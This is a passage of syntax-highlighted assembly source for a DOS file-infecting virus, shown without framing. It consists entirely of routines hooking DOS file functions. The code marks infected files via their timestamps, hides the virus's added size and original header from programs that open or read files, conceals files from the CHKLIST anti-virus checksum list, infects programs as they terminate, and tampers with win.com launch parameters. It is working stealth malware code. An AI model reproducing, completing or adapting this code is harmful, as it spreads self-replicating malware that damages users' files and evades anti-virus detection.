</span><span class="sc5">no_get_time</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">pop_all</span><span class="sc0">
</span><span class="sc5">exit_get_time</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">unhook_ints</span><span class="sc0">
                </span><span class="sc6">clc</span><span class="sc0">
                </span><span class="sc6">retf</span><span class="sc0"> </span><span class="sc2">02h</span><span class="sc0">

</span><span class="sc1">;ÚÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ¿</span><span class="sc0">
</span><span class="sc1">;³Set file date/time                                                        ³</span><span class="sc0">
</span><span class="sc1">;ÀÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÙ</span><span class="sc0">

</span><span class="sc5">dos_set_time</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc1">;Get function parameters</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">pop_all</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">push_all</span><span class="sc0">        

                </span><span class="sc1">;Get address of sft entry</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">get_sft</span><span class="sc0">        
                </span><span class="sc6">jc</span><span class="sc0"> </span><span class="sc5">no_set_time</span><span class="sc0">        

                </span><span class="sc1">;Check if file is already infected</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc8">di</span><span class="sc4">+</span><span class="sc2">0Dh</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">1Fh</span><span class="sc0">
                </span><span class="sc6">and</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc8">ah</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc8">ah</span><span class="sc0">
                </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">ok_set_time</span><span class="sc0">
</span><span class="sc5">no_set_time</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc1">;Exit if not infected or error</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">m21h_exit</span><span class="sc0">
</span><span class="sc5">ok_set_time</span><span class="sc4">:</span><span class="sc0">        
                </span><span class="sc1">;Perform time change but restore our marker</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">pop_all</span><span class="sc0">
                </span><span class="sc6">or</span><span class="sc0"> </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc2">1Fh</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">push_all</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">m21h_exit</span><span class="sc0">

</span><span class="sc1">;ÚÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ¿</span><span class="sc0">
</span><span class="sc1">;³Open file                                                                 ³</span><span class="sc0">
</span><span class="sc1">;ÀÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÙ</span><span class="sc0">

</span><span class="sc5">dos_open</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc1">;Call dos function</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">pop_all</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">dos_call</span><span class="sc0">
                </span><span class="sc6">jnc</span><span class="sc0"> </span><span class="sc5">do_open_file</span><span class="sc0">

                </span><span class="sc1">;Exit if error</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">unhook_ints</span><span class="sc0">
                </span><span class="sc6">stc</span><span class="sc0">
                </span><span class="sc6">retf</span><span class="sc0"> </span><span class="sc2">02h</span><span class="sc0">
</span><span class="sc5">do_open_file</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc1">;Save result</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">push_all</span><span class="sc0">

                </span><span class="sc1">;Get sft for file handle</span><span class="sc0">
                </span><span class="sc6">xchg</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">get_sft</span><span class="sc0">
                </span><span class="sc6">jc</span><span class="sc0"> </span><span class="sc5">no_changes</span><span class="sc0">

                </span><span class="sc1">;Check file name in sft</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc8">di</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc2">0020h</span><span class="sc0">
                </span><span class="sc6">cld</span><span class="sc0">
                </span><span class="sc6">lodsw</span><span class="sc0">

                </span><span class="sc1">;Check for chklist</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc3">"HC"</span><span class="sc0">
                </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">check_open_infection</span><span class="sc0">
                </span><span class="sc6">lodsw</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc3">"LK"</span><span class="sc0">
                </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">check_open_infection</span><span class="sc0">
                </span><span class="sc6">lodsw</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc3">"SI"</span><span class="sc0">
                </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">check_open_infection</span><span class="sc0">

                </span><span class="sc1">;Close file</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">3Eh</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">dos_call</span><span class="sc0">

                </span><span class="sc1">;Exit with error ( file not found )</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">unhook_ints</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">pop_all</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">0002h</span><span class="sc0">
                </span><span class="sc6">stc</span><span class="sc0">
                </span><span class="sc6">retf</span><span class="sc0"> </span><span class="sc2">02h</span><span class="sc0">

</span><span class="sc5">check_open_infection</span><span class="sc4">:</span><span class="sc0">

                </span><span class="sc1">;Check if file is infected</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc8">di</span><span class="sc4">+</span><span class="sc2">0Dh</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">1Fh</span><span class="sc0">
                </span><span class="sc6">and</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc8">ah</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc8">ah</span><span class="sc0">
                </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">no_changes</span><span class="sc0">

                </span><span class="sc1">;If infected stealth true size</span><span class="sc0">
                </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc8">di</span><span class="sc4">+</span><span class="sc2">11h</span><span class="sc4">],</span><span class="sc5">inf_byte_size</span><span class="sc0">
                </span><span class="sc6">sbb</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc8">di</span><span class="sc4">+</span><span class="sc2">13h</span><span class="sc4">],</span><span class="sc2">0000h</span><span class="sc0">
</span><span class="sc5">no_changes</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc1">;Open operation complete, return to caller</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">unhook_ints</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">pop_all</span><span class="sc0">
                </span><span class="sc6">clc</span><span class="sc0">
                </span><span class="sc6">retf</span><span class="sc0"> </span><span class="sc2">02h</span><span class="sc0">

</span><span class="sc1">;ÚÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ¿</span><span class="sc0">
</span><span class="sc1">;³Read file                                                                 ³</span><span class="sc0">
</span><span class="sc1">;ÀÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÙ</span><span class="sc0">

</span><span class="sc5">dos_read</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc1">;Restore function entry regs</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">pop_all</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">push_all</span><span class="sc0">

                </span><span class="sc1">;Duplicate handle</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">45h</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">dos_call</span><span class="sc0">
                </span><span class="sc6">jc</span><span class="sc0"> </span><span class="sc5">no_read_stealth</span><span class="sc0">        
                </span><span class="sc6">xchg</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">

                </span><span class="sc1">;Close new handle in order to update directory entry</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">3Eh</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">dos_call</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc0">

                </span><span class="sc1">;Get address of sft entry</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">get_sft</span><span class="sc0">        
                </span><span class="sc6">jc</span><span class="sc0"> </span><span class="sc5">no_read_stealth</span><span class="sc0">        

                </span><span class="sc1">;Check if file is already infected</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc8">di</span><span class="sc4">+</span><span class="sc2">0Dh</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">1Fh</span><span class="sc0">
                </span><span class="sc6">and</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc8">ah</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc8">ah</span><span class="sc0">
                </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">no_read_stealth</span><span class="sc0">

                </span><span class="sc1">;Check and save current offset in file</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc8">di</span><span class="sc4">+</span><span class="sc2">15h</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc5">file_header_size</span><span class="sc0">
                </span><span class="sc6">jae</span><span class="sc0"> </span><span class="sc5">no_read_stealth</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc8">di</span><span class="sc4">+</span><span class="sc2">17h</span><span class="sc4">],</span><span class="sc2">0000h</span><span class="sc0">
                </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">no_read_stealth</span><span class="sc0">

                </span><span class="sc1">;Save file-pointer position into header</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">file_offset</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">pop_all</span><span class="sc0">

                </span><span class="sc1">;Save address of read buffer</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">read_off</span><span class="sc4">],</span><span class="sc8">dx</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">read_seg</span><span class="sc4">],</span><span class="sc8">ds</span><span class="sc0">

                </span><span class="sc1">;Perform read operation</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">dos_call</span><span class="sc0">
                </span><span class="sc6">jnc</span><span class="sc0"> </span><span class="sc5">check_read</span><span class="sc0">

                </span><span class="sc1">;Error during file read</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">unhook_ints</span><span class="sc0">
                </span><span class="sc6">stc</span><span class="sc0">
                </span><span class="sc6">retf</span><span class="sc0"> </span><span class="sc2">02h</span><span class="sc0">

</span><span class="sc5">no_read_stealth</span><span class="sc4">:</span><span class="sc0">       
                </span><span class="sc1">;Exit if no read stealth        </span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">m21h_exit</span><span class="sc0">
</span><span class="sc5">check_read</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc1">;Restore regs and get file sft</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">push_all</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">get_sft</span><span class="sc0">

                </span><span class="sc1">;Save offset position</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc8">di</span><span class="sc4">+</span><span class="sc2">15h</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc8">di</span><span class="sc4">+</span><span class="sc2">17h</span><span class="sc4">]</span><span class="sc0">

                </span><span class="sc1">;Save file size</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc8">di</span><span class="sc4">+</span><span class="sc2">11h</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc8">di</span><span class="sc4">+</span><span class="sc2">13h</span><span class="sc4">]</span><span class="sc0">

                </span><span class="sc1">;Add virus size to file size</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc8">di</span><span class="sc4">+</span><span class="sc2">11h</span><span class="sc4">],</span><span class="sc5">inf_byte_size</span><span class="sc0">
                </span><span class="sc6">adc</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc8">di</span><span class="sc4">+</span><span class="sc2">13h</span><span class="sc4">],</span><span class="sc2">0000h</span><span class="sc0">

                </span><span class="sc1">;Point to old header in file</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">seek_end</span><span class="sc0">
                </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc8">di</span><span class="sc4">+</span><span class="sc2">15h</span><span class="sc4">],</span><span class="sc5">file_header_size</span><span class="sc4">+</span><span class="sc2">01h</span><span class="sc0">
                </span><span class="sc6">sbb</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc8">di</span><span class="sc4">+</span><span class="sc2">17h</span><span class="sc4">],</span><span class="sc2">0000h</span><span class="sc0">

                </span><span class="sc1">;Read old header and encryption key</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">3Fh</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc5">file_header_size</span><span class="sc4">+</span><span class="sc2">01h</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">old_header</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">dos_call</span><span class="sc0">
                </span><span class="sc6">jc</span><span class="sc0"> </span><span class="sc5">exit_read</span><span class="sc0">

                </span><span class="sc1">;Decrypt header</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">decrypt_header</span><span class="sc0">

                </span><span class="sc1">;Move old header into read buffer</span><span class="sc0">
                </span><span class="sc6">les</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">read_ptr</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">old_header</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc5">file_header_size</span><span class="sc4">-</span><span class="sc2">01h</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">file_offset</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">
                </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">
                </span><span class="sc6">cld</span><span class="sc0">
                </span><span class="sc6">rep</span><span class="sc0"> </span><span class="sc6">movsb</span><span class="sc0">
</span><span class="sc5">exit_read</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc1">;We need this again</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">get_sft</span><span class="sc0">

                </span><span class="sc1">;Restore file size</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc8">di</span><span class="sc4">+</span><span class="sc2">13h</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc8">di</span><span class="sc4">+</span><span class="sc2">11h</span><span class="sc4">]</span><span class="sc0">

                </span><span class="sc1">;Restore old offset in file</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc8">di</span><span class="sc4">+</span><span class="sc2">17h</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc8">di</span><span class="sc4">+</span><span class="sc2">15h</span><span class="sc4">]</span><span class="sc0">

                </span><span class="sc1">;Restore regs and exit</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">unhook_ints</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">pop_all</span><span class="sc0">
                </span><span class="sc6">clc</span><span class="sc0">
                </span><span class="sc6">retf</span><span class="sc0"> </span><span class="sc2">02h</span><span class="sc0">

</span><span class="sc1">;ÚÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ¿</span><span class="sc0">
</span><span class="sc1">;³Terminate program                                                         ³</span><span class="sc0">
</span><span class="sc1">;ÀÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÙ</span><span class="sc0">

</span><span class="sc5">dos_terminate_prog</span><span class="sc4">:</span><span class="sc0">

                </span><span class="sc1">;Try to infect file that was executed</span><span class="sc0">
                </span><span class="sc1">;(filename in our buffer)</span><span class="sc0">

                </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">execute_filename</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">infect_file_ds_dx</span><span class="sc0">

</span><span class="sc1">;ÚÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ¿</span><span class="sc0">
</span><span class="sc1">;³Exec ( execute program )                                                  ³</span><span class="sc0">
</span><span class="sc1">;ÀÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÙ</span><span class="sc0">

</span><span class="sc5">dos_exec</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc1">;Restore function entry regs</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">pop_all</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">push_all</span><span class="sc0">

                </span><span class="sc1">;Save segmet of parameter block</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc0">

                </span><span class="sc1">;Copy filename into our buffer</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc8">dx</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">execute_filename</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc0">
</span><span class="sc5">copy_filename</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">lodsb</span><span class="sc0">
                </span><span class="sc6">stosb</span><span class="sc0">
                </span><span class="sc6">or</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc8">al</span><span class="sc0">
                </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">copy_filename</span><span class="sc0">

                </span><span class="sc1">;Restore segment of parameter block</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc0">

                </span><span class="sc1">;Check if file to execute is win.com</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">si</span><span class="sc4">-</span><span class="sc2">04h</span><span class="sc4">],</span><span class="sc3">"OC"</span><span class="sc0">
                </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">no_win_com</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">si</span><span class="sc4">-</span><span class="sc2">08h</span><span class="sc4">],</span><span class="sc3">"IW"</span><span class="sc0">
                </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">no_win_com</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">si</span><span class="sc4">-</span><span class="sc2">06h</span><span class="sc4">],</span><span class="sc3">".N"</span><span class="sc0">
                </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">no_win_com</span><span class="sc0">

                </span><span class="sc1">;Add parameters to win.com</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">find_end_string</span><span class="sc0">
                </span><span class="sc6">jc</span><span class="sc0"> </span><span class="sc5">exit_add_param</span><span class="sc0">
